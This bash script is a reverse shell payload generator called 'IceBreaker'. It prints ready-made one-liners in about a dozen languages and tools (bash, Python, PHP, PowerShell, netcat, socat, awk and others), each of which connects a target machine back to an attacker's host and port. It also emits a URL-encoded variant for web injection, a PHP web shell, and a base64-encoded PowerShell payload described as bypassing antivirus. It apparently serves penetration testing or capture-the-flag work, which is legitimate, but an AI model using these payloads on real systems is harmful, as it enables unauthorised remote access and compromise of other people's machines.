#!/usr/bin/env bash
# =============================================================================
# IceBreaker — Reverse Shell Generator
# Generates reverse shell payloads using $LHOST and $LPORT.
#
# Usage:
#   revshell [type]     Generate a specific payload (uses $LHOST/$LPORT)
#   revshell --list     Show available types
#   revshell --all      Print all payloads
#   revshell            Interactive — prompts for type
# =============================================================================

set -euo pipefail

GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

# ── Resolve LHOST/LPORT ─────────────────────────────────────────────────────
if [[ -z "${LHOST:-}" ]]; then
  LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[^/]+' || \
          ip -4 addr show tun1 2>/dev/null | grep -oP 'inet \K[^/]+' || \
          ip -4 addr show eth0 2>/dev/null | grep -oP 'inet \K[^/]+' || \
          echo "")
  if [[ -z "$LHOST" ]]; then
    echo -e "${YELLOW}[!]${NC} Could not auto-detect LHOST. Set it with: settarget <IP>"
    read -rp "Enter LHOST: " LHOST
  fi
fi

if [[ -z "${LPORT:-}" ]]; then
  LPORT=4444
fi

# ── Available shell types ────────────────────────────────────────────────────
TYPES=(bash python python3 perl php powershell nc ncat ruby java xterm socat awk lua)

show_list() {
  echo -e "${BOLD}Available reverse shell types:${NC}"
  for t in "${TYPES[@]}"; do
    echo -e "  ${CYAN}$t${NC}"
  done
}

# ── Payload generators ───────────────────────────────────────────────────────
gen_bash() {
  echo -e "${BOLD}${GREEN}── Bash ──${NC}"
  echo -e "${CYAN}bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1${NC}"
  echo ""
  echo -e "${DIM}# URL-encoded (for web injection):${NC}"
  echo -e "${CYAN}bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F${LHOST}%2F${LPORT}%200%3E%261${NC}"
  echo ""
  echo -e "${DIM}# Bash with exec:${NC}"
  echo -e "${CYAN}bash -c 'exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1'${NC}"
  echo ""
}

gen_python() {
  echo -e "${BOLD}${GREEN}── Python 2 ──${NC}"
  echo -e "${CYAN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${NC}"
  echo ""
}

gen_python3() {
  echo -e "${BOLD}${GREEN}── Python 3 ──${NC}"
  echo -e "${CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${NC}"
  echo ""
  echo -e "${DIM}# PTY upgrade (run after catching shell):${NC}"
  echo -e "${CYAN}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'${NC}"
  echo -e "${DIM}# Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm${NC}"
  echo ""
}

gen_perl() {
  echo -e "${BOLD}${GREEN}── Perl ──${NC}"
  echo -e "${CYAN}perl -e 'use Socket;\$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${NC}"
  echo ""
}

gen_php() {
  echo -e "${BOLD}${GREEN}── PHP ──${NC}"
  echo -e "${CYAN}php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${NC}"
  echo ""
  echo -e "${DIM}# PHP exec (web shell one-liner):${NC}"
  echo -e "${CYAN}<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'\"); ?>${NC}"
  echo ""
}

gen_powershell() {
  echo -e "${BOLD}${GREEN}── PowerShell ──${NC}"
  echo -e "${CYAN}powershell -nop -c \"\\\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\\\$stream = \\\$client.GetStream();[byte[]]\\\$bytes = 0..65535|%{0};while((\\\$i = \\\$stream.Read(\\\$bytes, 0, \\\$bytes.Length)) -ne 0){;\\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$bytes,0, \\\$i);\\\$sendback = (iex \\\$data 2>&1 | Out-String );\\\$sendback2 = \\\$sendback + 'PS ' + (pwd).Path + '> ';\\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\\$sendback2);\\\$stream.Write(\\\$sendbyte,0,\\\$sendbyte.Length);\\\$stream.Flush()};\\\$client.Close()\"${NC}"
  echo ""
  echo -e "${DIM}# Base64-encoded (bypass AV/filtering):${NC}"
  local raw="\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
  local b64
  b64=$(echo -n "$raw" | iconv -t UTF-16LE 2>/dev/null | base64 -w 0 2>/dev/null || echo "<base64 encoding failed — iconv/base64 needed>")
  echo -e "${CYAN}powershell -nop -enc ${b64}${NC}"
  echo ""
}

gen_nc() {
  echo -e "${BOLD}${GREEN}── Netcat (nc) ──${NC}"
  echo -e "${CYAN}nc -e /bin/sh ${LHOST} ${LPORT}${NC}"
  echo ""
  echo -e "${DIM}# mkfifo fallback (when -e is not available):${NC}"
  echo -e "${CYAN}rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${LHOST} ${LPORT} > /tmp/f${NC}"
  echo ""
}

gen_ncat() {
  echo -e "${BOLD}${GREEN}── Ncat ──${NC}"
  echo -e "${CYAN}ncat ${LHOST} ${LPORT} -e /bin/sh${NC}"
  echo ""
  echo -e "${DIM}# With SSL:${NC}"
  echo -e "${CYAN}ncat --ssl ${LHOST} ${LPORT} -e /bin/sh${NC}"
  echo ""
}

gen_ruby() {
  echo -e "${BOLD}${GREEN}── Ruby ──${NC}"
  echo -e "${CYAN}ruby -rsocket -e'f=TCPSocket.open(\"${LHOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${NC}"
  echo ""
}

gen_java() {
  echo -e "${BOLD}${GREEN}── Java ──${NC}"
  echo -e "${CYAN}Runtime r = Runtime.getRuntime(); String[] cmd = {\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\"}; Process p = r.exec(cmd);${NC}"
  echo ""
}

gen_xterm() {
  echo -e "${BOLD}${GREEN}── Xterm ──${NC}"
  echo -e "${DIM}# Start X server listener first: xnest :1 or Xephyr :1${NC}"
  echo -e "${CYAN}xterm -display ${LHOST}:1${NC}"
  echo ""
}

gen_socat() {
  echo -e "${BOLD}${GREEN}── Socat ──${NC}"
  echo -e "${DIM}# Listener:  socat file:\`tty\`,raw,echo=0 tcp-listen:${LPORT}${NC}"
  echo -e "${CYAN}socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}${NC}"
  echo ""
}

gen_awk() {
  echo -e "${BOLD}${GREEN}── Awk ──${NC}"
  echo -e "${CYAN}awk 'BEGIN {s = \"/inet/tcp/0/${LHOST}/${LPORT}\"; while(42) { do{ printf \"shell> \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null${NC}"
  echo ""
}

gen_lua() {
  echo -e "${BOLD}${GREEN}── Lua ──${NC}"
  echo -e "${CYAN}lua -e \"require('socket');require('os');t=socket.tcp();t:connect('${LHOST}','${LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"${NC}"
  echo ""
}

# ── Generate a single type ───────────────────────────────────────────────────
generate() {
  case "$1" in
    bash)       gen_bash ;;
    python)     gen_python ;;
    python3)    gen_python3 ;;
    perl)       gen_perl ;;
    php)        gen_php ;;
    powershell) gen_powershell ;;
    nc)         gen_nc ;;
    ncat)       gen_ncat ;;
    ruby)       gen_ruby ;;
    java)       gen_java ;;
    xterm)      gen_xterm ;;
    socat)      gen_socat ;;
    awk)        gen_awk ;;
    lua)        gen_lua ;;
    *)          echo "Unknown type: $1"; show_list; return 1 ;;
  esac
}

# ── Main ─────────────────────────────────────────────────────────────────────
echo ""
echo -e "${CYAN}  ╔══════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}  ║${NC}${BOLD}  ___  _____   _____ _  _ ___ _    _            ${NC}${CYAN}║${NC}"
echo -e "${CYAN}  ║${NC}${BOLD} | _ \\| __\\ \\ / / __| || | __| |  | |           ${NC}${CYAN}║${NC}"
echo -e "${CYAN}  ║${NC}${BOLD} |   /| _| \\ V /\\__ \\ __ | _|| |__| |__         ${NC}${CYAN}║${NC}"
echo -e "${CYAN}  ║${NC}${BOLD} |_|_\\|___| \\_/ |___/_||_|___|____|____|        ${NC}${CYAN}║${NC}"
echo -e "${CYAN}  ║${NC}                                                  ${CYAN}║${NC}"
echo -e "${CYAN}  ║${NC}  ${DIM}[ IceBreaker // Reverse Shell Generator ]${NC}      ${CYAN}║${NC}"
echo -e "${CYAN}  ║${NC}  ${DIM}LHOST=${LHOST}  LPORT=${LPORT}${NC}"
echo -e "${CYAN}  ╚══════════════════════════════════════════════════╝${NC}"
echo ""

case "${1:-}" in
  --list|-l)
    show_list
    ;;
  --all|-a)
    for t in "${TYPES[@]}"; do
      generate "$t"
    done
    ;;
  --help|-h)
    echo "Usage: revshell [type|--list|--all]"
    echo ""
    echo "  revshell bash       Generate bash reverse shell"
    echo "  revshell --list     Show available types"
    echo "  revshell --all      Print all payloads"
    echo ""
    echo "Set LHOST/LPORT with: settarget <IP> [PORT]"
    ;;
  "")
    show_list
    echo ""
    read -rp "Select type: " choice
    echo ""
    generate "$choice"
    ;;
  *)
    generate "$1"
    ;;
esac
